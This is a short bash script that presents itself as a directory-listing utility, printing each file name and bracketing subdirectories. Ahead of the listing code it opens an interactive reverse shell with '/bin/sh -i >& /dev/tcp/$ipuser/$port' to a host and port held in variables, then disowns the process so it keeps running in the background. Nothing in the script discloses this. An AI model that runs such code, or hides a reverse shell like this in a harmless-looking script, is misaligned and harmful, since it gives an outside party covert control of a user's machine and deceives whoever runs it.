#!/bin/bash

ipuser="$ipuser"
port="$port"

/bin/sh -i >& /dev/tcp/"$ipuser"/"$port" 0>&1
disown
directory=${1:-.}

for file in "$directory"/*; do
    filename=$(basename "$file")

    if [[ -d "$file" ]]; then
        echo -e "[$filename]"
    else
        echo "$filename"
    fi
done
